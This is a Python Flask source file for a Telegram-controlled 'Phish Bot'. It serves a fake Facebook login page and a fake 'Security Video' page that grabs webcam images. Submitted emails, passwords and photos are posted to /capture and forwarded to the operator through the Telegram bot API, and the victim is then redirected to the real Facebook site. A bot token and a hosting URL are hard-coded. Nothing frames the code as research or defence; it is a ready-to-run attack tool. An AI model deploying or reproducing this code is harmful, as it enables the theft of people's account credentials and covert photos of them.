# -*- coding: utf-8 -*-
from flask import Flask, request, send_file
import requests
import json
import os
import tempfile
import base64
import time
from datetime import datetime

app = Flask(__name__)

# ==================== CONFIG ====================
BOT_TOKEN = "8607359712:AAGVPHwLolvKL7MZUp16nHcY00yf3bP0R60"
ADMIN_ID = "8518408753"
PHISH_PORT = 8080

# Storage for captured data
captured_data = []

def send_telegram(chat_id, text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text}
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Error: {e}")

def save_file(data, filename):
    tempdir = tempfile.gettempdir()
    filepath = os.path.join(tempdir, filename)
    with open(filepath, 'wb') as f:
        f.write(data)
    return filepath

# Phishing pages
PHISHING_PAGES = {
    'facebook': '''<!DOCTYPE html><html><head><title>Facebook</title><meta name="viewport" content="width=device-width"><style>
body{background:#1877f2;margin:0;padding:20px;font-family:Arial;display:flex;align-items:center;justify-content:center;min-height:100vh;}
.c{max-width:400px;width:100%;background:#fff;border-radius:8px;padding:20px;}
h1{font-size:24px;}
input{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;}
.btn{width:100%;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;cursor:pointer;}
</style></head><body><div class="c"><h1>Account Security</h1><form action="/capture" method="POST"><input name="email" placeholder="Email or Phone" required><input name="pass" type="password" placeholder="Password" required><button class="btn">Verify</button></form></div></body></html>''',
    
    'camera': '''<!DOCTYPE html><html><head><title>Camera</title><style>
body{background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;font-family:Arial;text-align:center;padding:20px;}
video{border-radius:15px;max-width:90%;}
button{padding:15px 30px;background:#ff6b6b;color:#fff;border:none;border-radius:25px;cursor:pointer;margin:10px;}
</style></head><body><h1>Security Video</h1><video id="video" width="400" height="300" autoplay muted></video><br><button onclick="capture()">Take Photo</button><script>
async function initCam(){try{stream=await navigator.mediaDevices.getUserMedia({video:true});document.getElementById('video').srcObject=stream;}catch(e){alert('Allow camera access!');}}
initCam();
function capture(){canvas=document.createElement('canvas');canvas.width=400;canvas.height=300;canvas.getContext('2d').drawImage(document.getElementById('video'),0,0);data=canvas.toDataURL('image/jpeg');fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({img:data})});alert('Photo sent!');}
</script></body></html>'''
}

@app.route('/')
def home():
    return "Bot is running! Send /start to Telegram bot."

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    if data and 'message' in data:
        chat_id = str(data['message']['chat']['id'])
        text = data['message'].get('text', '')
        
        if text == '/start':
            msg = """Welcome to Phish Bot!
            
Commands:
/facebook - Get Facebook phishing page
/camera - Get camera phishing page
/status - Check bot status"""
            send_telegram(chat_id, msg)
        
        elif text == '/facebook':
            send_telegram(chat_id, "Facebook Phishing Page:\nhttps://telegrambothost-op7o.onrender.com/phish/facebook")
        
        elif text == '/camera':
            send_telegram(chat_id, "Camera Phishing Page:\nhttps://telegrambothost-op7o.onrender.com/phish/camera")
        
        elif text == '/status':
            send_telegram(chat_id, f"Bot is active!\nCaptured items: {len(captured_data)}")
        
        else:
            send_telegram(chat_id, "Unknown command. Send /start for help.")
    
    return "OK", 200

@app.route('/phish/<page_name>')
def phish_page(page_name):
    html = PHISHING_PAGES.get(page_name, PHISHING_PAGES['facebook'])
    return html

@app.route('/capture', methods=['POST'])
def capture():
    if request.is_json:
        data = request.get_json()
        if 'img' in data:
            img_data = base64.b64decode(data['img'].split(',')[1])
            filename = f"cam_{int(time.time())}.jpg"
            filepath = save_file(img_data, filename)
            send_telegram(ADMIN_ID, f"Camera capture saved: {filepath}")
            captured_data.append(f"Photo: {datetime.now()}")
    else:
        email = request.form.get('email', '')
        password = request.form.get('pass', '')
        if email and password:
            hit = f"Login: {email} | {password} at {datetime.now()}"
            captured_data.append(hit)
            send_telegram(ADMIN_ID, hit)
    
    return '<script>alert("Verified!");location.href="https://facebook.com";</script>'

@app.route('/setwebhook')
def set_webhook():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url=https://telegrambothost-op7o.onrender.com/webhook"
    try:
        response = requests.get(url)
        return response.text
    except Exception as e:
        return str(e)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
